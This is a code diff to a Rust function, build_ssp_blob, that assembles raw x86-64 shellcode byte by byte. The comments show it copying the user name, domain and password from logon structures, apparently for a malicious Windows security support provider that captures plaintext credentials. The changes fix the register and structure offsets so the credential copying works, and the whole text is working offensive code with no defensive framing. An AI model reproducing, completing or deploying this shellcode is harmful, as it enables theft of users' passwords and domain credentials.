@@ -244,7 +244,7 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     blob.extend_from_slice(&[0x41, 0x57]);                   // push r15
     blob.extend_from_slice(&[0x48, 0x81, 0xEC]);             // sub rsp, 0x108
     blob.extend_from_slice(&0x108u32.to_le_bytes());
-    blob.extend_from_slice(&[0x49, 0x89, 0xD5]);             // mov r13, rdx
+    blob.extend_from_slice(&[0x4D, 0x89, 0xC5]);             // mov r13, r8
     // Get position-independent anchor: call $+5; pop r15
     blob.extend_from_slice(&[0xE8, 0x00, 0x00, 0x00, 0x00]); // call $+5
     blob.extend_from_slice(&[0x41, 0x5F]);                   // pop r15
@@ -366,11 +366,11 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     blob.extend_from_slice(&[0xB9, 0x21, 0x00, 0x00, 0x00]); // mov ecx, 33
     blob.extend_from_slice(&[0xF3, 0x48, 0xAB]);             // rep stosq
 
-    // ── Copy UserName (UNICODE_STRING at r13+0x00) ────────────────
-    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x08]);       // mov r12, [r13+0x08]
+    // ── Copy UserName (UNICODE_STRING at r13+0x08) ────────────────
+    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x10]);       // mov r12, [r13+0x10]
     blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
     blob.extend_from_slice(&[0x74, 0x1F]);                     // jz skip_username (31 bytes)
-    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x45, 0x00]); // movzx eax, word [r13]
+    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x45, 0x08]); // movzx eax, word [r13+0x08]
     blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
     blob.extend_from_slice(&[0x74, 0x16]);                     // jz skip_username
     blob.extend_from_slice(&[0x3D, 0x80, 0x00, 0x00, 0x00]); // cmp eax, 128
@@ -382,11 +382,11 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     blob.extend_from_slice(&[0xF3, 0xA4]);                     // rep movsb
     // skip_username:
 
-    // ── Copy Domain (UNICODE_STRING at r13+0x10) ──────────────────
-    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x18]);       // mov r12, [r13+0x18]
+    // ── Copy Domain (UNICODE_STRING at r13+0x18) ──────────────────
+    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x20]);       // mov r12, [r13+0x20]
     blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
     blob.extend_from_slice(&[0x74, 0x20]);                     // jz skip_domain (32 bytes)
-    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x45, 0x10]); // movzx eax, word [r13+0x10]
+    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x45, 0x18]); // movzx eax, word [r13+0x18]
     blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
     blob.extend_from_slice(&[0x74, 0x17]);                     // jz skip_domain
     blob.extend_from_slice(&[0x3D, 0x80, 0x00, 0x00, 0x00]); // cmp eax, 128
@@ -398,11 +398,11 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     blob.extend_from_slice(&[0xF3, 0xA4]);                     // rep movsb
     // skip_domain:
 
-    // ── Copy Password (UNICODE_STRING at r13+0x20) ────────────────
-    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x28]);       // mov r12, [r13+0x28]
+    // ── Copy Password (UNICODE_STRING at r13+0x28) ────────────────
+    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x30]);       // mov r12, [r13+0x30]
     blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
     blob.extend_from_slice(&[0x74, 0x23]);                     // jz skip_password (35 bytes)
-    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x45, 0x20]); // movzx eax, word [r13+0x20]
+    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x45, 0x28]); // movzx eax, word [r13+0x28]
     blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
     blob.extend_from_slice(&[0x74, 0x1A]);                     // jz skip_password
     blob.extend_from_slice(&[0x3D, 0x00, 0x01, 0x00, 0x00]); // cmp eax, 256
